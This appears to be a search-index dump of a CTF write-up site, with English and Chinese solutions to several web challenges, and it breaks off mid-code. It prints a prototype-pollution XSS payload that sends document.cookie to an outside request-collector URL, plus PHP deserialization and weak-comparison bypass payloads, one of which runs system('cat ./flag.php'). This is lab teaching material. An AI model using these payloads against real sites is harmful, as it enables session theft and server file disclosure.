9cdfb439c7876e703e307864c9167a15 ){ if ( urlParams . has ( help )) { repairWithHelper ( urlParams . get ( help )) } } else { infobox ( `Repairing this is not that easy.` ) } } porsche . ignition = () = { infobox ( `Hmm ... WTF!` ) } $ ( document ). ready (() = { const [ car ] = cars $ ( .fa-power-off ). click (() = car . powerOn ()) $ ( .fa-car ). click (() = car . info ()) $ ( .fa-lightbulb-o ). click (() = car . light ()) $ ( .fa-battery-quarter ). click (() = car . battery ()) $ ( .fa-key ). click (() = car . ignition ()) $ ( .fa-wrench ). click (() = car . repair ()) $ ( .fa-step-forward ). click (() = nextCar ()) if ( h . includes ( Bugatti )) autoStart ( bugatti ) if ( h . includes ( Porsche )) autoStart ( porsche ) }) const nextCar = () = { cars . push ( cars . shift ()) $ ( .image ). attr ( src , cars [ 0 ]. pic ); } const autoStart = ( car ) = { car . repair () car . ignition () car . powerOn () } const repairWithHelper = ( src ) = { /* who needs csp anyways !? */ urlRegx = /^\\w{4,5}:\\/\\/car-repair-shop\\.fluxfingersforfuture\\.fluxfingers\\.net\\/[\\w\\d]+\\/.+\\.js$/ ; if ( urlRegx . test ( src )) { let s = document . createElement ( script ) s . src = src $ ( head ). append ( s ) } } const infobox = ( text ) = { $ ( a ). css ({ pointer-events : none , border : none }) $ ( .infobox ). addClass ( infoAnimate ) . text ( text ) . on ( animationend , function () { $ ( this ). removeClass ( infoAnimate ) $ ( a ). css ({ pointer-events : all , border : solid 1px rgba(255, 255, 255, .25) }) }) It is the main js file.The initialized bugatti and porsche have no keys, we need to write, and then trigger the whole process through * autoStart() . In addition,we found *Porsche.repair() will call repairWithHelper() which will load outside js file.Yeah!We will load car.key.js with it. So,let's do it. Exploit According to the analysis just,we can add key to bugatti and call its autoStart() .And then,we can call repairWithHelper() to load car.key.js .For $.md5,since it is encrypted from the lowest level of prototype.So we can pollute it prototype to change its MD5 value. Finally,the payload: https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair ={ key : ?? , __proto__ : { __proto__ : [ lol ]}} help = https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/assets/js/car.key.js#BugattiPorsche Two cars have keys and they have been repaired. Howevers,there is nothing happen.Maybe this isn't the last step.We need to bypass repairWithHelper() and XSS it,but I stopped here since I have no ideas. By viewing master WE_0WN_Y0U writeup ,I make the payload: https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair ={ key : ?? , __proto__ : { __proto__ : [ lol ]}} help = data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/assets/javascript,alert ( 1 ) //.js#BugattiPorsche And it work! Now,we try to get the flag.We can use fetch() to send value to the website controlled by ourselves, such as https://requestbin.com/ which can let us see what will be sent by fetch() Finally,the payload like the following https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={ key : ?? , __proto__ :{ __proto__ :[ lol ]}} help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/assets/javascript,fetch( https://en3c2qcyr45h7.x.pipedream.net/ +document.cookie)//.js#BugattiPorsche The flag is: flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}","title":"car_repair"},{"location":"web/JavaScript_prototype_chain_pollution/car_repair/#car-repair-shop","text":"\"Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.\"","title":"Car Repair Shop"},{"location":"web/JavaScript_prototype_chain_pollution/car_repair/#examination-site","text":"JavaScript prototype chain pollution XSS","title":"Examination Site"},{"location":"web/JavaScript_prototype_chain_pollution/car_repair/#analysis","text":"Viewing the source code,we will found several key files script src = assets/js/car.class.js / script script src = assets/js/util.js / script !-- script src= assets/js/car.key.js /script -- From car.class.js powerOn () { if ( this . isStarted ()) { infobox ( `Well Done!` ) nextCar () } else { $ ( .chargeup )[ 0 ]. play () } } repair () { if ( urlParams . has ( repair )) { $ . extend ( true , this , JSON . parse ( urlParams . get ( repair ))) } } ignition () { if ( this . key == ) { infobox ( `Looks like the key got lost. No wonder the car is not starting ...` ) } if ( this . key == ?? ) { infobox ( `The car started!` ) this . start () } } } From the Car class, we know the process of repairing the car: Repair()- powerOn()- ignition().In addition,we found the exploit: $.extend(true, this, JSON.parse(urlParams.get('repair'))) It is easy to know that the exploit is \"JavaScript Prototypein pollution\".We can write the key through the prototype chain. From car.class.js porsche . key = ?? porsche . start () This js file can get the porsche's key and let it start.We have to load it. From util.js const urlParams = new URLSearchParams ( window . location . search ) const h = location . hash . slice ( 1 ) const bugatti = new Car ( Bugatti , T35 , green , assets/images/bugatti.png ) const porsche = new Car ( Porsche , 911 , yellow , assets/images/porsche.png ) const cars = [ bugatti , porsche ] porsche . repair = () = { if ( ! bugatti . isStarted ()){ infobox ( `Not so fast. Repair the other car first!` ) } else if ( $ . md5 ( porsche ) == 9cdfb439c7876e703e307864c9167a15 ){ if ( urlParams . has ( help )) { repairWithHelper ( urlParams . get ( help )) } } else { infobox ( `Repairing this is not that easy.` ) } } porsche . ignition = () = { infobox ( `Hmm ... WTF!` ) } $ ( document ). ready (() = { const [ car ] = cars $ ( .fa-power-off ). click (() = car . powerOn ()) $ ( .fa-car ). click (() = car . info ()) $ ( .fa-lightbulb-o ). click (() = car . light ()) $ ( .fa-battery-quarter ). click (() = car . battery ()) $ ( .fa-key ). click (() = car . ignition ()) $ ( .fa-wrench ). click (() = car . repair ()) $ ( .fa-step-forward ). click (() = nextCar ()) if ( h . includes ( Bugatti )) autoStart ( bugatti ) if ( h . includes ( Porsche )) autoStart ( porsche ) }) const nextCar = () = { cars . push ( cars . shift ()) $ ( .image ). attr ( src , cars [ 0 ]. pic ); } const autoStart = ( car ) = { car . repair () car . ignition () car . powerOn () } const repairWithHelper = ( src ) = { /* who needs csp anyways !? */ urlRegx = /^\\w{4,5}:\\/\\/car-repair-shop\\.fluxfingersforfuture\\.fluxfingers\\.net\\/[\\w\\d]+\\/.+\\.js$/ ; if ( urlRegx . test ( src )) { let s = document . createElement ( script ) s . src = src $ ( head ). append ( s ) } } const infobox = ( text ) = { $ ( a ). css ({ pointer-events : none , border : none }) $ ( .infobox ). addClass ( infoAnimate ) . text ( text ) . on ( animationend , function () { $ ( this ). removeClass ( infoAnimate ) $ ( a ). css ({ pointer-events : all , border : solid 1px rgba(255, 255, 255, .25) }) }) It is the main js file.The initialized bugatti and porsche have no keys, we need to write, and then trigger the whole process through * autoStart() . In addition,we found *Porsche.repair() will call repairWithHelper() which will load outside js file.Yeah!We will load car.key.js with it. So,let's do it.","title":"Analysis"},{"location":"web/JavaScript_prototype_chain_pollution/car_repair/#exploit","text":"According to the analysis just,we can add key to bugatti and call its autoStart() .And then,we can call repairWithHelper() to load car.key.js .For $.md5,since it is encrypted from the lowest level of prototype.So we can pollute it prototype to change its MD5 value. Finally,the payload: https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair ={ key : ?? , __proto__ : { __proto__ : [ lol ]}} help = https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/assets/js/car.key.js#BugattiPorsche Two cars have keys and they have been repaired. Howevers,there is nothing happen.Maybe this isn't the last step.We need to bypass repairWithHelper() and XSS it,but I stopped here since I have no ideas. By viewing master WE_0WN_Y0U writeup ,I make the payload: https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair ={ key : ?? , __proto__ : { __proto__ : [ lol ]}} help = data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/assets/javascript,alert ( 1 ) //.js#BugattiPorsche And it work! Now,we try to get the flag.We can use fetch() to send value to the website controlled by ourselves, such as https://requestbin.com/ which can let us see what will be sent by fetch() Finally,the payload like the following https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={ key : ?? , __proto__ :{ __proto__ :[ lol ]}} help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/assets/javascript,fetch( https://en3c2qcyr45h7.x.pipedream.net/ +document.cookie)//.js#BugattiPorsche The flag is: flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}","title":"Exploit"},{"location":"web/PHP/WHUCTF-EasyPHP/","text":"WHUCTF Easy PHP \u7ed5\u8fc7 + \u53cd\u5e8f\u5217\u5316 Analysis Source Code ?php error_reporting(0); include flag.php ; highlight_file(__FILE__); if (!$_COOKIE[ admin ]) { exit( \\nNot authenticated.\\n ); } if (!preg_match( /^{ hash : [\\w\\ ]+}$/ , $_COOKIE[ admin ])){ exit( \u8fd8\u770b\u4e0d\u61c2\u6b63\u5219\u8868\u8fbe\u5f0f? \u8fd8\u4e0d\u5feb\u53bb\u767e\u5ea6! \\n ); } $session_data = json_decode($_COOKIE[ admin ], true); if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u8fd9\u91cc\u6709\u4e24\u4e2a\u7ed5\u8fc7\u70b9\uff1a 1\uff09\u9996\u5148\u6784\u9020\u5408\u9002\u7684 Cookie:admin={\"hash\": xxxx} \uff0c \u8fd9\u91cc\u7684 xxxx \u5fc5\u987b\u4e3a\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c \u4f46\u662f\u8fd9\u4e2a xxxx \u7684\u503c\u9700\u8981\u4e0e md5($flag) \u5f31\u76f8\u7b49\u3002 \u5206\u6790\u4e0b\u9762\u7684\u6e90\u7801\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u7ed3\u5408\u63d0\u793a\uff1a \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 00111110000000110000000101011110 \u5b83\u7ed9\u7684\u63d0\u793a\u5176\u5b9e\u662f\u5c06\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4e4b\u540e\u5f97\u5230\u7684\u7ed3\u679c\uff1a 00111110000000110000000101011110 \uff0c\u5176\u4e2d\u7684 echo(ord(MD5($flag)[$i]) 6); \u8f93\u51faflag md5\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4f4d\u540e\u7684\u7ed3\u679c\uff0c\u5206\u6790\u4e00\u4e0b\uff1a \u82e5\u662f\u5b57\u6bcd\u8f93\u51fa1\uff0c\u6570\u5b57\u8f93\u51fa0\uff0c\u6211\u4eec\u53ef\u4ee5\u5224\u65ad\u51faflag md5\u503c\u524d2\u4f4d\u5c0f\u4e8e64\u4e3a\u6570\u5b57\u3002\u518d\u901a\u8fc7php\u5f31\u7c7b\u578b\u6bd4\u8f83\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u5229\u7528burp\u4ece0\u523099\u7206\u7834\uff0c\u572861\u5c31\u53d1\u73b0\u7ed5\u8fc7\u4e86\u8fd9\u4e00\u9650\u5236\uff0c\u6240\u4ee5\u6700\u7ec8Cookie\u8bbe\u7f6e\u4e3a\uff1a Cookie:admin={\"hash\": 61} \u7ed5\u8fc7\u7b2c\u4e00\u5173\uff01\uff01\uff01 \u975e\u9884\u671f\uff1a \u8fd9\u4e0a\u9762\u662f\u4e00\u4e2a\u9884\u671f\u89e3\uff0c\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3\uff0c\u7531\u4e8e\u6b63\u5219\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u672c\u6765hash\u503c\u7684\u5185\u5bb9\u53ea\u5e94\u5141\u8bb8\u8f93\u5165md5\u5305\u542b\u7684\u5b57\u7b26\u5373[0-9a-f] \u82e5\u8f93\u5165\u503c\u4e3a admin={\"hash\": True} \uff0c\u4f7f\u7528json_decode\u53ef\u4ee5\u5c06hash\u503c\u89e3\u6790\u4e3a\u5e03\u5c14\u503cTrue\uff0c\u800c\u6211\u4eec\u77e5\u9053php\u5f31\u7c7b\u578b\u7279\u6027\uff1a \u56e0\u6b64\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u90e8\u5206\u7ed5\u8fc7\u3002 unserialize \u63a5\u4e0b\u6765\u5c31\u662f\u6784\u9020\u53cd\u5e8f\u5217\u5316\uff1a class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u53cd\u5e8f\u5217\u5316\u539f\u7406\u662f\u4f60\u6b63\u5e38\u5e8f\u5217\u5316\u51fa\u6765\u662f\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:5:\"Study\":0:{}} \u7136\u540e\u6539\u6210\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:4:\"Evil\":0:{}} \uff0c\u518d urlencode \u4e00\u4e0b\u3002 Payload ?php class WHUCTF { protected $stu; function __constsuct(){ $this- stu = new Evil(); } function __destruct(){ $this- stu- action(); } } class Study{ function action(){ echo CTF \u771f\u597d\u73a9~ ; } } class Evil{ function action(){ system( cat./flag.php ); } } $a = new WHUCTF(); echo serialize($a); // O:6: WHUCTF :1:{s:6: *stu ;N;} echo urlencode(serialize($a)); // O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D \u7ed3\u679c\uff1a dmsj.php?whuctf=O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D","title":"WHUCTF-EasyPHP"},{"location":"web/PHP/WHUCTF-EasyPHP/#whuctf-easy-php","text":"\u7ed5\u8fc7 + \u53cd\u5e8f\u5217\u5316","title":"WHUCTF Easy PHP"},{"location":"web/PHP/WHUCTF-EasyPHP/#analysis","text":"","title":"Analysis"},{"location":"web/PHP/WHUCTF-EasyPHP/#source-code","text":"?php error_reporting(0); include flag.php ; highlight_file(__FILE__); if (!$_COOKIE[ admin ]) { exit( \\nNot authenticated.\\n ); } if (!preg_match( /^{ hash : [\\w\\ ]+}$/ , $_COOKIE[ admin ])){ exit( \u8fd8\u770b\u4e0d\u61c2\u6b63\u5219\u8868\u8fbe\u5f0f? \u8fd8\u4e0d\u5feb\u53bb\u767e\u5ea6! \\n ); } $session_data = json_decode($_COOKIE[ admin ], true); if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u8fd9\u91cc\u6709\u4e24\u4e2a\u7ed5\u8fc7\u70b9\uff1a 1\uff09\u9996\u5148\u6784\u9020\u5408\u9002\u7684 Cookie:admin={\"hash\": xxxx} \uff0c \u8fd9\u91cc\u7684 xxxx \u5fc5\u987b\u4e3a\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c \u4f46\u662f\u8fd9\u4e2a xxxx \u7684\u503c\u9700\u8981\u4e0e md5($flag) \u5f31\u76f8\u7b49\u3002 \u5206\u6790\u4e0b\u9762\u7684\u6e90\u7801\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u7ed3\u5408\u63d0\u793a\uff1a \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 00111110000000110000000101011110 \u5b83\u7ed9\u7684\u63d0\u793a\u5176\u5b9e\u662f\u5c06\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4e4b\u540e\u5f97\u5230\u7684\u7ed3\u679c\uff1a 00111110000000110000000101011110 \uff0c\u5176\u4e2d\u7684 echo(ord(MD5($flag)[$i]) 6); \u8f93\u51faflag md5\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4f4d\u540e\u7684\u7ed3\u679c\uff0c\u5206\u6790\u4e00\u4e0b\uff1a \u82e5\u662f\u5b57\u6bcd\u8f93\u51fa1\uff0c\u6570\u5b57\u8f93\u51fa0\uff0c\u6211\u4eec\u53ef\u4ee5\u5224\u65ad\u51faflag md5\u503c\u524d2\u4f4d\u5c0f\u4e8e64\u4e3a\u6570\u5b57\u3002\u518d\u901a\u8fc7php\u5f31\u7c7b\u578b\u6bd4\u8f83\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u5229\u7528burp\u4ece0\u523099\u7206\u7834\uff0c\u572861\u5c31\u53d1\u73b0\u7ed5\u8fc7\u4e86\u8fd9\u4e00\u9650\u5236\uff0c\u6240\u4ee5\u6700\u7ec8Cookie\u8bbe\u7f6e\u4e3a\uff1a Cookie:admin={\"hash\": 61} \u7ed5\u8fc7\u7b2c\u4e00\u5173\uff01\uff01\uff01","title":"Source Code"},{"location":"web/PHP/WHUCTF-EasyPHP/#_1","text":"\u8fd9\u4e0a\u9762\u662f\u4e00\u4e2a\u9884\u671f\u89e3\uff0c\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3\uff0c\u7531\u4e8e\u6b63\u5219\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u672c\u6765hash\u503c\u7684\u5185\u5bb9\u53ea\u5e94\u5141\u8bb8\u8f93\u5165md5\u5305\u542b\u7684\u5b57\u7b26\u5373[0-9a-f] \u82e5\u8f93\u5165\u503c\u4e3a admin={\"hash\": True} \uff0c\u4f7f\u7528json_decode\u53ef\u4ee5\u5c06hash\u503c\u89e3\u6790\u4e3a\u5e03\u5c14\u503cTrue\uff0c\u800c\u6211\u4eec\u77e5\u9053php\u5f31\u7c7b\u578b\u7279\u6027\uff1a \u56e0\u6b64\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u90e8\u5206\u7ed5\u8fc7\u3002","title":"\u975e\u9884\u671f\uff1a"},{"location":"web/PHP/WHUCTF-EasyPHP/#unserialize","text":"","title":"unserialize"},{"location":"web/PHP/WHUCTF-EasyPHP/#_2","text":"class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u53cd\u5e8f\u5217\u5316\u539f\u7406\u662f\u4f60\u6b63\u5e38\u5e8f\u5217\u5316\u51fa\u6765\u662f\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:5:\"Study\":0:{}} \u7136\u540e\u6539\u6210\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:4:\"Evil\":0:{}} \uff0c\u518d urlencode \u4e00\u4e0b\u3002","title":"\u63a5\u4e0b\u6765\u5c31\u662f\u6784\u9020\u53cd\u5e8f\u5217\u5316\uff1a"},{"location":"web/PHP/WHUCTF-EasyPHP/#payload","text":"?php class WHUCTF { protected $stu; function __constsuct(){ $this- stu = new Evil(); } function __destruct(){ $this- stu- action(); } } class Study{ function action(){ echo CTF \u771f\u597d\u73a9~ ; } } class Evil{ function action(){ system( cat./flag.php ); } } $a = new WHUCTF(); echo serialize($a); // O:6: WHUCTF :1:{s:6: *stu ;N;} echo urlencode(serialize($a)); // O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D \u7ed3\u679c\uff1a dmsj.php?whuctf=O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D","title":"Payload"},{"location":"web/PHP/ichunqiuCTF_easyphp/","text":"\u7f51\u7edc\u5185\u751f\u5b89\u5168\u8bd5\u9a8c\u573a\u2014\u2014CTF\u7b54\u9898\u593a\u65d7\u8d5b\uff08\u7b2c\u4e8c\u5b63\uff09 easyphp Analyze \u67e5\u770b\u7f51\u9875\u6e90\u7801 html head /head body img src= show.php?img=aGludC5qcGc= width= 100% /body /html \u8bbf\u95ee\u9875\u9762\u65f6\u53d1\u73b0\u6709\u4e00\u5f20\u56fe\u7247\uff0c\u67e5\u770b\u56fe\u7247\u5730\u5740 http://120.55.43.255:13005/show.php?img=aGludC5qcGc= aGludC5qcGc= base64\u89e3\u7801\u5f97\u5230 hint.jpg \uff0c\u7531\u6b64\u53ef\u4ee5\u5f97\u77e5 show.php \u662f\u5c06\u53c2\u6570 img \u7ecfbase64\u89e3\u7801\u5f97\u5230\u7684\u503c\u8fdb\u884c\u8bfb\u6587\u4ef6\u64cd\u4f5c\u3002 \u5c1d\u8bd5\u4f7f\u7528 php://filter/read=convert.base64-encode/resource=index.php base64\u89e3\u7801\u503c\u8bfb\u53d6\u6e90\u7801 http://120.55.43.255:13005/show.php?img=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluZGV4LnBocA== \u8fd4\u56de\"File not found!\"\u3002\u3002\u3002 Get Source \u7ea0\u7ed3\u4e86\u4e00\u4e0b\u4e0b\uff0c\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff0c\u7136\u540e\u53c8\u5c1d\u8bd5\u76f4\u63a5\u5c06 index.php base64\u7f16\u7801\uff0c\u53ef\u770b\u5230\u6ce8\u91ca\u6389\u7684php\u6e90\u7801\uff0c\u5c45\u7136\u6210\u529f\u4e86\uff0c\u770b\u6765\u662f\u60f3\u590d\u6742\u4e86\u3002 \u4e0a\u6e90\u7801\uff1a index.php ?php require_once( hint.php ); $x = new hint(); isset($_GET[ class ]) $g = $_GET[ class ]; if (!empty($g)) { $x = unserialize($g); echo $x; } ? \u53d1\u73b0hint.php ?php error_reporting(0); //flag is in flag.php class hint { public $file= ; function __destruct() { if(!empty($this- file)) { if(strchr($this- file, \\\\ )===false strchr($this- file, / )===false) show_source(dirname (__FILE__). / .$this - file); else die( Wrong filename. ); } } function __wakeup(){ $this- file= index.php ; } public function __toString(){ return ; } } ? \u6e90\u7801\u4e2d\u7684\u6ce8\u91ca\u90e8\u5206\u63d0\u793aflag\u5728flag.php\u4e2d \u60f3\u5c1d\u8bd5\u7528show.php\u76f4\u63a5\u8bfb\u53d6flag.php\uff0c\u5206\u6790show.php\uff1a ?php $f = $_GET[ img ]; if (!empty($f)) { $f = base64_decode($f); if (stripos($f, .. )===FALSE stripos($f, / )===FALSE stripos($f, \\\\ )===FALSE stripos($f, flag )===FALSE) { readfile($f); } else { echo File not found! ; } } ? \u53d1\u73b0 flag \u88ab\u8fc7\u6ee4\u4e86\uff0c\u800c\u4e14 / \u4e5f\u88ab\u7ed5\u8fc7\u4e86\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u4e4b\u524d\u4f7f\u7528 php://filter \u51fa\u9519\u7684\u539f\u56e0\u3002 \u5c1d\u8bd5\u7ed5\u8fc7\uff0c\u4e0d\u8fc7\u8fc7\u6ee4\u6bd4\u8f83\u4e25\u683c\uff0c\u7ed5\u8fc7\u6709\u70b9\u96be\u5ea6\uff0c\u8f6c\u800c\u5206\u6790\u5176\u4ed6\u4e24\u4e2a\u6587\u4ef6\u3002 Unserialize \u6d89\u53ca\u5230**\u53cd\u5e8f\u5217\u5316**\uff1a $x = unserialize($g); ,\u53d1\u73b0\u5728hint.php\u4e2d function __destruct() { if(!empty($this- file)) { if(strchr($this- file, \\\\ )===false strchr($this- file, / )===false) show_source(dirname (__FILE__). / .$this - file); else die( Wrong filename. ); } } \u5b58\u5728\u6587\u4ef6\u8bfb\u53d6\uff0c\u53ef\u4ee5\u6784\u9020**Payload**\u4f7f\u5f97 $this- file = \"flag.php\" \uff0c\u7531 ?php error_reporting(0); //flag is in flag.php class hint{ public $file= ; function __destruct(){ if(!empty($this- file)) { if(strchr($this- file, \\\\ )===false strchr($this- file, / )===false) show_source(dirname (__FILE__). / .$this - file); else die( Wrong filename. ); }} function __wakeup(){ $this- file= index.php ; } public function __toString(){return ;} } $a = new hint(); $a- file = flag.php ; echo serialize($a); \u5f97\u5230\u5b57\u7b26\u4e32 O:4:\"hint\":1:{s:4:\"file\";s:8:\"flag.php\";} \uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u80fd\u8bfb\u53d6\u5230flag.php\u6587\u4ef6\uff0c\u56e0\u4e3a\u5728\u5e8f\u5217\u5316\u65f6\uff0c __wakeup() \u51fd\u6570\u53c8\u4f1a\u5c06 \"index.php\" \u8d4b\u503c\u7ed9 $this- file . \u8fd9\u91cc\u6d89\u53ca\u7684\u53e6\u4e00\u4e2a\u77e5\u8bc6\uff0c\u662fphp\u672c\u8eab\u7684\u4e00\u4e2abug\uff0c\u8be6\u7ec6\u4fe1\u606f\u53ef\u4ee5\u67e5\u8be2 php bug 72663 \uff0c\u8fd9\u4e2a bug \u7684\u539f\u7406\u662f\uff1a\u5f53\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\uff0c\u8868\u793a**\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u5c5e\u6027\u4e2a\u6570**\u65f6\uff0c\u4f1a\u8df3\u8fc7 __wakeup \u51fd\u6570\u7684\u6267\u884c\u3002 \u4e8e\u662f\u5c06hint\u503c\u6539\u4e3a2 Payload\uff1a http://120.55.43.255:13005/index.php?class=O:4: hint :2:{s:4: file ;s:8: flag.php ;}","title":"ichunqiuCTF_easyphp"},{"location":"web/PHP/ichunqiuCTF_easyphp/#ctf","text":"","title":"\u7f51\u7edc\u5185\u751f\u5b89\u5168\u8bd5\u9a8c\u573a\u2014\u2014CTF\u7b54\u9898\u593a\u65d7\u8d5b\uff08\u7b2c\u4e8c\u5b63\uff09"},{"location":"web/PHP/ichunqiuCTF_easyphp/#easyphp","text":"","title":"easyphp"},{"location":"web/PHP/ichunqiuCTF_easyphp/#analyze","text":"\u67e5\u770b\u7f51\u9875\u6e90\u7801 html head /head body img src= show.php?img=aGludC5qcGc= width= 100% /body /html \u8bbf\u95ee\u9875\u9762\u65f6\u53d1\u73b0\u6709\u4e00\u5f20\u56fe\u7247\uff0c\u67e5\u770b\u56fe\u7247\u5730\u5740 http://120.55.43.255:13005/show.php?img=aGludC5qcGc= aGludC5qcGc= base64\u89e3\u7801\u5f97\u5230 hint.jpg \uff0c\u7531\u6b64\u53ef\u4ee5\u5f97\u77e5 show.php \u662f\u5c06\u53c2\u6570 img \u7ecfbase64\u89e3\u7801\u5f97\u5230\u7684\u503c\u8fdb\u884c\u8bfb\u6587\u4ef6\u64cd\u4f5c\u3002 \u5c1d\u8bd5\u4f7f\u7528 php://filter/read=convert.base64-encode/resource=index.php base64\u89e3\u7801\u503c\u8bfb\u53d6\u6e90\u7801 http://120.55.43.255:13005/show.php?img=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluZGV4LnBocA== \u8fd4\u56de\"File not found!\"\u3002\u3002\u3002","title":"Analyze"},{"location":"web/PHP/ichunqiuCTF_easyphp/#get-source","text":"\u7ea0\u7ed3\u4e86\u4e00\u4e0b\u4e0b\uff0c\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff0c\u7136\u540e\u53c8\u5c1d\u8bd5\u76f4\u63a5\u5c06 index.php base64\u7f16\u7801\uff0c\u53ef\u770b\u5230\u6ce8\u91ca\u6389\u7684php\u6e90\u7801\uff0c\u5c45\u7136\u6210\u529f\u4e86\uff0c\u770b\u6765\u662f\u60f3\u590d\u6742\u4e86\u3002 \u4e0a\u6e90\u7801\uff1a index.php ?php require_once( hint.php ); $x = new hint(); isset($_GET[ class ]) $g = $_GET[ class ]; if (!empty($g)) { $x = unserialize($g); echo $x; } ? \u53d1\u73b0hint.php ?php error_reporting(0); //flag is in flag.php class hint { public $file= ; function __destruct() { if(!empty($this- file)) { if(strchr($this- file, \\\\ )===false strchr($this- file, / )===false) show_source(dirname (__FILE__). / .$this - file); else die( Wrong filename. ); } } function __wakeup(){ $this- file= index.php ; } public function __toString(){ return ; } } ? \u6e90\u7801\u4e2d\u7684\u6ce8\u91ca\u90e8\u5206\u63d0\u793aflag\u5728flag.php\u4e2d \u60f3\u5c1d\u8bd5\u7528show.php\u76f4\u63a5\u8bfb\u53d6flag.php\uff0c\u5206\u6790show.php\uff1a ?php $f = $_GET[ img ]; if (!empty($f)) { $f = base64_decode($f); if (stripos($f, .. 